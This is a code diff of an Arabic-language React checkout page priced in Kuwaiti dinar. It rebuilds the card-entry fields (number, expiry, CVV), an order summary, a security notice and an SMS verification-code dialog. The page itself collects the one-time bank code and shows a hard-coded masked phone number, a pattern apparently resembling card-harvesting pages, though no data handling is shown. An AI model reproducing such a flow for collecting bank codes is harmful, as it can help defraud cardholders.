+                                  value={formData.cardNumber}
+                                  onChange={(e) => handleInputChange("cardNumber", e.target.value)}
+                                  className="h-12 border-2 border-slate-200 focus:border-red-500 focus:ring-4 focus:ring-red-100 transition-all duration-200 font-mono text-lg tracking-wider bg-white/50 pr-4"
+                                  required
+                                />
+                                <div className="absolute left-4 top-1/2 transform -translate-y-1/2">
+                                  {cardType ? (
+                                    <div className="w-8 h-5">
+                                      <img
+                                        src={`/${cardType}.svg`}
+                                        alt={cardType}
+                                        className="w-full h-full object-contain"
+                                      />
+                                    </div>
+                                  ) : (
+                                    <CreditCard className="w-5 h-5 text-slate-400" />
+                                  )}
+                                </div>
+                              </div>
+                              <p className="text-xs text-slate-500 mt-1">أدخل رقم البطاقة بدون مسافات</p>
+                            </div>
+
+                            <div className="grid grid-cols-2 gap-6">
+                              <div className="group" dir="rtl">
+                                <Label
+                                  htmlFor="expiryDate"
+                                  className="text-slate-700 text-sm font-semibold mb-3 block flex items-center"
+                                >
+                                  تاريخ الانتهاء <span className="text-red-500 mx-1">*</span>
+                                  <TooltipProvider>
+                                    <Tooltip>
+                                      <TooltipTrigger asChild>
+                                        <Info className="w-3.5 h-3.5 text-slate-400 cursor-help" />
+                                      </TooltipTrigger>
+                                      <TooltipContent className="bg-slate-800 text-white p-2 text-xs">
+                                        أدخل الشهر/السنة كما هو مكتوب على البطاقة
+                                      </TooltipContent>
+                                    </Tooltip>
+                                  </TooltipProvider>
+                                </Label>
+                                <Input
+                                  id="expiryDate"
+                                  placeholder="MM/YY"
+                                  value={expiryDate}
+                                  onChange={(e) => handleInputChange("expiryDate", e.target.value)}
+                                  className="h-12 border-2 border-slate-200 focus:border-red-500 focus:ring-4 focus:ring-red-100 transition-all duration-200 font-mono text-base bg-white/50"
+                                  dir="rtl"
+                                  required
+                                  maxLength={5}
+                                />
+                              </div>
+                              <div className="group" dir="rtl">
+                                <Label
+                                  htmlFor="cvv"
+                                  className="text-slate-700 text-base font-semibold mb-3 block flex items-center"
+                                >
+                                  رمز الأمان <span className="text-red-500 mx-1">*</span>
+                                  <TooltipProvider>
+                                    <Tooltip>
+                                      <TooltipTrigger asChild>
+                                        <Info className="w-3.5 h-3.5 text-slate-400 cursor-help" />
+                                      </TooltipTrigger>
+                                      <TooltipContent className="bg-slate-800 text-white p-2 text-xs">
+                                        رمز الأمان المكون من 3 أو 4 أرقام على ظهر البطاقة
+                                      </TooltipContent>
+                                    </Tooltip>
+                                  </TooltipProvider>
+                                </Label>
+                                <div className="relative">
+                                  <Input
+                                    id="cvv"
+                                    placeholder="***"
+                                    value={formData.cvv}
+                                    onChange={(e) => handleInputChange("cvv", e.target.value)}
+                                    className="h-12 border-2 border-slate-200 focus:border-red-500 focus:ring-4 focus:ring-red-100 transition-all duration-200 font-mono text-base bg-white/50"
+                                    dir="rtl"
+                                    maxLength={4}
+                                    type="tel"
+                                    minLength={3}
+                                    required
+                                  />
+                                  <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 w-4 h-4 text-slate-400" />
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      )}
+                    </CardContent>
+                  </Card>
+
+                
+                </RadioGroup>
+
+                <Separator className="my-8" />
+
+                {/* Order Summary */}
+                <Card className="border border-slate-200 bg-slate-50/70 mb-8">
+                  <CardHeader className="pb-2">
+                    <CardTitle className="text-lg font-bold text-slate-700">ملخص الطلب</CardTitle>
+                  </CardHeader>
+                  <CardContent className="pt-0">
+                    <div className="space-y-2">
+                      <div className="flex justify-between text-sm">
+                        <span className="text-slate-600">المبلغ الأساسي</span>
+                        <span className="font-medium">{amount}.000 د.ك</span>
+                      </div>
+                      <div className="flex justify-between text-sm">
+                        <span className="text-slate-600">رسوم الخدمة</span>
+                        <span className="font-medium">0.000 د.ك</span>
+                      </div>
+                      <Separator className="my-2" />
+                      <div className="flex justify-between font-bold">
+                        <span className="text-slate-800">المبلغ الإجمالي</span>
+                        <span className="text-red-700">{amount}.000 د.ك</span>
                       </div>
                     </div>
+                  </CardContent>
+                </Card>
 
-                    {paymentMethod === "card" && (
-                      <div
-                        className={`grid gap-6 ${isArabic ? "pr-8" : "pl-8"} animate-in fade-in-50 duration-500`}
-                        dir={isArabic ? "rtl" : "ltr"}
-                      >
-                        <div className="grid gap-3">
-                          <div className="flex items-center justify-between">
-                            <Label
-                              htmlFor="card-number"
-                              className="flex items-center gap-2 text-gray-700 font-semibold"
-                            >
-                              {t("cardNumber")}
-                              <TooltipProvider>
-                                <Tooltip>
-                                  <TooltipTrigger asChild>
-                                    <Info className="h-4 w-4 text-gray-400" />
-                                  </TooltipTrigger>
-                                  <TooltipContent>
-                                    <p>{t("cardNumberTooltip")}</p>
-                                  </TooltipContent>
-                                </Tooltip>
-                              </TooltipProvider>
-                            </Label>
-                            {formErrors.cardNumber && (
-                              <span className="text-sm text-red-600 flex items-center gap-1 font-medium">
-                                <AlertCircle className="h-4 w-4" /> {formErrors.cardNumber}
-                              </span>
-                            )}
-                          </div>
-                          <div className="relative">
-                            <Input
-                              id="card-number"
-                              placeholder="1234 5678 9012 3456"
-                              value={cardNumber}
-                              onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
-                              maxLength={19}
-                              className={`rounded-xl h-14 px-5 text-lg font-mono border-2 transition-all duration-200 touch-manipulation ${
-                                formErrors.cardNumber
-                                  ? "border-red-300 focus:border-red-500"
-                                  : "border-gray-200 focus:border-red-500"
-                              }`}
-                            />
-                            
-                          </div>
-                        </div>
-                        <div className="grid grid-cols-2 gap-6">
-                          <div className="grid gap-3">
-                            <div className="flex items-center justify-between">
-                              <Label htmlFor="expiry" className="text-gray-700 font-semibold">
-                                {t("expiryDate")}
-                              </Label>
-                              {formErrors.cardExpiry && (
-                                <span className="text-sm text-red-600 flex items-center gap-1 font-medium">
-                                  <AlertCircle className="h-4 w-4" /> {formErrors.cardExpiry}
-                                </span>
-                              )}
-                            </div>
-                            <Input
-                              id="expiry"
-                              placeholder="MM/YY"
-                              type="tel"
-                              value={cardExpiry}
-                              onChange={(e) => setCardExpiry(formatExpiry(e.target.value as any)as any )}
-                              maxLength={5}
-                              className={`rounded-xl h-14 text-lg font-mono border-2 transition-all duration-200 touch-manipulation ${
-                                formErrors.cardExpiry
-                                  ? "border-red-300 focus:border-red-500"
-                                  : "border-gray-200 focus:border-red-500"
-                              }`}
-                            />
-                          </div>
-                          <div className="grid gap-3">
-                            <div className="flex items-center justify-between">
-                              <Label htmlFor="cvc" className="text-gray-700 font-semibold">
-                                {t("securityCode")}
-                              </Label>
-                              {formErrors.cardCvc && (
-                                <span className="text-sm text-red-600 flex items-center gap-1 font-medium">
-                                  <AlertCircle className="h-4 w-4" /> {formErrors.cardCvc}
-                                </span>
-                              )}
-                            </div>
-                            <Input
-                              id="cvc"
-                              placeholder="123"
-                              type="tel"
-                              maxLength={4}
-                              value={cardCvc}
-                              onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
-                              className={`rounded-xl h-14 text-lg font-mono border-2 transition-all duration-200 touch-manipulation ${
-                                formErrors.cardCvc
-                                  ? "border-red-300 focus:border-red-500"
-                                  : "border-gray-200 focus:border-red-500"
-                              }`}
-                            />
-                          </div>
-                        </div>
+                {/* Security Notice with animation */}
+                <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-xl p-6 relative overflow-hidden">
+                  <div className="absolute top-0 right-0 w-32 h-32 bg-green-200/30 rounded-full -mr-16 -mt-16 animate-pulse-slow"></div>
+                  <div className="relative z-10">
+                    <div className="flex items-start">
+                      <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center ml-4 flex-shrink-0">
+                        <Shield className="w-5 h-5 text-green-600" />
                       </div>
-                    )}
-{/* 
-                    <div className="relative">
-                      <div
-                        className={`absolute inset-0 rounded-2xl transition-all duration-300 ${
-                          paymentMethod === "paypal" ? "ring-2 ring-red-500 shadow-lg" : ""
-                        }`}
-                      ></div>
-                      <div className="flex items-center space-x-2 relative">
-                        <RadioGroupItem value="paypal" id="paypal" className="text-red-500 border-gray-300" />
-                        <Label
-                          htmlFor="paypal"
-                          className="flex items-center gap-4 cursor-pointer rounded-2xl border-2 border-gray-200 p-6 hover:bg-gray-50 hover:border-gray-300 transition-all duration-200 w-full touch-manipulation active:scale-95"
-                        >
-                          <div className="bg-gradient-to-br from-red-500 to-red-600 text-white p-3 rounded-xl">
-                            <Wallet className="h-6 w-6" />
-                          </div>
-                          <div className="font-semibold text-gray-900 text-lg">{t("knet")}</div>
-                          <div className={`flex gap-2 ${isArabic ? "mr-auto" : "ml-auto"}`}>
-                            <img src="/vercel.svg" className="h-6 w-6" />
-                          </div>
-                        </Label>
+                      <div>
+                        <h3 className="font-semibold text-green-800 mb-2">حماية متقدمة</h3>
+                        <p className="text-green-700 text-sm leading-relaxed">
+                          جميع المعاملات محمية بتشفير SSL 256-bit ومعايير PCI DSS. لا نحتفظ ببيانات بطاقتك الائتمانية
+                          على خوادمنا.
+                        </p>
                       </div>
-                    </div> */}
+                    </div>
                   </div>
-                </RadioGroup>
-              </div>
-            </CardContent>
-            <CardFooter className="flex flex-col gap-6 border-t border-gray-100 pt-8 bg-white">
-              <Button
-                className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-2xl shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 touch-manipulation"
-                disabled={!paymentMethod || isProcessing}
-                onClick={handlePayment}
-              >
-                {isProcessing ? (
-                  <span className="flex items-center gap-3">
-                    <svg
-                      className={`animate-spin ${isArabic ? "-ml-1 mr-3" : "-mr-1 ml-3"} h-5 w-5 text-white`}
-                      xmlns="http://www.w3.org/2000/svg"
-                      fill="none"
-                      viewBox="0 0 24 24"
-                    >
-                      <circle
-                        className="opacity-25"
-                        cx="12"
-                        cy="12"
-                        r="10"
-                        stroke="currentColor"
-                        strokeWidth="4"
-                      ></circle>
-                      <path
-                        className="opacity-75"
-                        fill="currentColor"
-                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                      ></path>
-                    </svg>
-                    {t("processing")}
-                  </span>
-                ) : (
-                  <span className="flex items-center gap-3">
-                    {t("payNow")}
-                    <ArrowRight className="h-5 w-5" />
-                  </span>
-                )}
-              </Button>
-              <div className="flex items-center justify-center gap-3 text-sm text-gray-500 bg-gray-50 rounded-xl p-4">
-                <Shield className="h-4 w-4" />
-                <span className="font-medium">{t("allTransactionsSecure")}</span>
-              </div>
-            </CardFooter>
-          </>
-        )}
-
-        {paymentState === "SUCCESS" && renderSuccessState()}
-
-        {/* OTP Dialog */}
-        <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
-          <DialogContent className="sm:max-w-sm rounded-3xl border-0 shadow-2xl" dir={isArabic ? "rtl" : "ltr"}>
-            <DialogHeader className="text-center pb-6 border-b border-gray-100">
-              <div className="flex justify-center mb-6">
-                <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center border border-blue-100">
-                  <Smartphone className="h-8 w-8 text-blue-600" />
                 </div>
-              </div>
-              <DialogTitle className="text-2xl font-bold text-gray-900">{t("paymentVerification")}</DialogTitle>
-              <DialogDescription className="text-gray-600 text-base mt-2">
-                {t("enterVerificationCode")}
-              </DialogDescription>
-            </DialogHeader>
 
-            <div className="bg-gray-50 rounded-2xl p-6 my-6 border border-gray-100">
-              <div className="flex justify-between items-center mb-4 pb-3 border-b border-gray-200">
-                <span className="text-sm font-medium text-gray-500 uppercase tracking-wide">{t("orderNumber")}</span>
-                <span className="font-bold text-gray-900">{orderDetails.id}</span>
+                <Button
+                  type="submit"
+                  disabled={
+                    isLoading ||
+                    (formData.paymentMethod === "credit-card" &&
+                      (formData.cardNumber.length < 16 || !expiryDate || !formData.cvv))
+                  }
+                  className="w-full mt-8 h-12 bg-gradient-to-r from-[#a00064] to-pink-600 hover:from-red-700 hover:to-pink-700 text-white font-bold text-lg shadow-xl transition-all duration-300 hover:shadow-2xl hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none relative overflow-hidden"
+                >
+                  {isLoading ? (
+                    <div className="flex items-center justify-center">
+                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin ml-3"></div>
+                      جاري المعالجة...
+                    </div>
+                  ) : (
+                    <>
+                      <div className="absolute inset-0 bg-white/10 animate-pulse-slow"></div>
+                      <span className="relative z-10 flex items-center justify-center">
+                        المتابعة للدفع الآمن
+                        <ArrowRight className="w-5 h-5 mr-3" />
+                      </span>
+                    </>
+                  )}
+                </Button>
+              </CardContent>
+            </Card>
+          </form>
+        </div>
+      </div>
+
+      {/* Enhanced OTP Dialog with animations */}
+      <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
+        <DialogContent className="w-[95vw] max-w-sm sm:max-w-md lg:max-w-lg mx-auto rounded-2xl border-0 shadow-2xl bg-white/95 backdrop-blur-sm">
+          <DialogHeader className="text-center pb-4 sm:pb-6">
+            <div className="relative mx-auto mb-4 sm:mb-6">
+              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-red-100 to-pink-100 rounded-2xl flex items-center justify-center relative overflow-hidden">
+                <div className="absolute inset-0 bg-gradient-to-tr from-red-200 to-transparent animate-pulse"></div>
+                <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-red-600 relative z-10" />
               </div>
-              <div className="flex justify-between items-center">
-                <span className="text-sm font-medium text-gray-500 uppercase tracking-wide">{t("totalAmount")}</span>
-                <span className="font-bold text-xl text-gray-900">
-                  {orderDetails.total} {isArabic ? "د.ك" : "KWD"}
-                </span>
+              <div className="absolute -inset-2 bg-gradient-to-r from-red-500/20 to-pink-500/20 rounded-2xl animate-pulse"></div>
+            </div>
+            <DialogTitle className="text-xl sm:text-2xl font-bold text-slate-800 mb-2">تأكيد رمز التحقق</DialogTitle>
+            <p className="text-sm sm:text-base text-slate-600">للحماية الإضافية لحسابك</p>
+          </DialogHeader>
+
+          <div className="space-y-4 py-2 sm:py-4">
+            <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-xl p-4 sm:p-6 relative overflow-hidden">
+              <div className="absolute top-0 left-0 w-32 h-32 bg-blue-200/20 rounded-full -ml-16 -mt-16 animate-pulse-slow"></div>
+              <div className="relative z-10">
+                <p className="text-center text-slate-700 leading-relaxed text-sm sm:text-base">
+                  تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم هاتفك
+                  <br />
+                  <span className="font-bold text-slate-900 text-base sm:text-lg">+965 5** *** ***</span>
+                </p>
               </div>
             </div>
 
-            <div className="text-center mb-6 bg-blue-50 rounded-xl p-4 border border-blue-100">
-              <p className="text-sm mb-1 text-blue-600 font-medium">{t("codeSentTo")}</p>
-              <p className="font-bold text-blue-900">+965 5XX XXX XX89</p>
-            </div>
-
-            <div className="flex justify-center gap-3 my-8">
-              {otpValues.map((value, index) => (
-                <div key={index} className="relative">
-                  <Input
-                    ref={(el) => (otpInputRefs.current[index] = el)}
-                    type="tel"
-                    inputMode="numeric"
-                    maxLength={1}
-                    value={value}
-                    onChange={(e) => handleOtpChange(index, e.target.value)}
-                    onKeyDown={(e) => handleKeyDown(index, e)}
-                    className={`w-14 h-16 text-center text-xl font-bold rounded-xl border-2 transition-all duration-200 touch-manipulation ${
-                      otpError ? "border-red-300 focus:border-red-500" : "border-gray-200 focus:border-red-500"
-                    }`}
-                  />
-                </div>
-              ))}
+            <div className="flex justify-center px-2">
+              <InputOTP maxLength={6} value={otpValue} onChange={handleOtpChange}>
+                <InputOTPGroup className="gap-1 sm:gap-2 md:gap-3">
+                  {[0, 1, 2, 3, 4, 5].map((index) => (
+                    <InputOTPSlot
+                      key={index}
+                      index={index}
+                      className="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 text-lg sm:text-xl font-bold border-2 border-slate-200 focus:border-red-500 focus:ring-4 focus:ring-red-100 transition-all duration-200 bg-white/80"
+                    />
+                  ))}
+                </InputOTPGroup>
+              </InputOTP>
             </div>
 
             {otpError && (
-              <div className="bg-red-50 text-red-600 rounded-xl p-4 text-center text-sm flex items-center justify-center gap-2 border border-red-100 font-medium">
-                <AlertCircle className="h-4 w-4" />
-                {otpError}
-              </div>
+              <Card className="border-red-200 bg-gradient-to-r from-red-50 to-pink-50 animate-shake">
+                <CardContent className="p-3 sm:p-4">
+                  <div className="text-center text-red-600 font-medium flex items-center justify-center text-sm sm:text-base">
+                    <div className="w-5 h-5 bg-red-100 rounded-full flex items-center justify-center ml-2">
+                      <span className="text-red-600 text-xs">!</span>
+                    </div>
+                    {otpError}
+                  </div>
+                </CardContent>
+              </Card>
             )}
 
-            <div className="text-center mb-6">
-              <p className="text-sm text-gray-500 mb-3">{t("didntReceiveCode")}</p>
+            <div className="space-y-3 sm:space-y-4">
               <Button
-                variant="link"
-                onClick={resendOtp}
-                disabled={resendDisabled}
-                className="text-sm p-0 h-auto text-gray-700 hover:text-gray-900 font-semibold touch-manipulation"
+                onClick={handleOtpSubmit}
+                className="w-full h-12 sm:h-14 bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 text-white font-bold text-base sm:text-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 shadow-lg hover:shadow-xl relative overflow-hidden"
+                disabled={otpValue.length !== 6 || isLoading}
               >
-                {resendDisabled ? `${t("resendAfter")} ${countdown} ${t("seconds")}` : t("resendCode")}
+                {isLoading ? (
+                  <div className="flex items-center justify-center">
+                    <div className="w-4 h-4 sm:w-5 sm:h-5 border-2 border-white/30 border-t-white rounded-full animate-spin ml-3"></div>
+                    <span className="text-sm sm:text-base">جاري المعالجة...</span>
+                  </div>
+                ) : (
+                  <>
+                    <div className="absolute inset-0 bg-white/10 animate-pulse-slow"></div>
+                    <span className="relative z-10 text-sm sm:text-base">تأكيد الرمز والمتابعة</span>
+                  </>
+                )}
+              </Button>
+
+              <Button
+                variant="outline"
+                className="w-full h-12 sm:h-14 border-2 border-slate-200 text-slate-600 hover:bg-slate-50 font-semibold text-sm sm:text-base transition-all duration-200"
+                onClick={handleResendOtp}
+                disabled={!canResend || isLoading}
+              >
+                {canResend ? "إعادة إرسال الرمز" : <>إعادة الإرسال بعد {timeLeft} ثانية</>}
               </Button>
             </div>
 
-            <DialogFooter className="sm:justify-center pt-6 border-t border-gray-100">
-              <Button
-                className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-2xl shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 touch-manipulation"
-                disabled={otpValues.some((v) => !v) || isProcessing}
-                onClick={verifyOtp}
-              >
-                {isProcessing ? (
-                  <span className="flex items-center gap-3">
-                    <svg
-                      className={`animate-spin ${isArabic ? "mr-3" : "ml-3"} h-5 w-5 text-white`}
-                      xmlns="http://www.w3.org/2000/svg"
-                      fill="none"
-                      viewBox="0 0 24 24"
-                    >
-                      <circle
-                        className="opacity-25"
-                        cx="12"
-                        cy="12"
-                        r="10"
-                        stroke="currentColor"
-                        strokeWidth="4"
-                      ></circle>
-                      <path
-                        className="opacity-75"
-                        fill="currentColor"
-                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                      ></path>
-                    </svg>
-                    {t("verifying")}
-                  </span>
-                ) : (
-                  <span className="flex items-center gap-3">
-                    <Lock className="h-5 w-5" />
-                    {t("confirm")}
-                  </span>
-                )}
-              </Button>
-            </DialogFooter>
-          </DialogContent>
-        </Dialog>
-      </Card>
+            <div className="bg-slate-50 rounded-xl p-2 sm:p-2">
+              <p className="text-center text-xs sm:text-sm text-slate-500 leading-relaxed">
+                لم تستلم الرمز؟ تحقق من رسائل SMS أو انتظر انتهاء العداد لإعادة الإرسال
+                <br />
+                <span className="font-medium">هذا الرمز صالح لمدة 5 دقائق فقط</span>
+              </p>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   )
 }
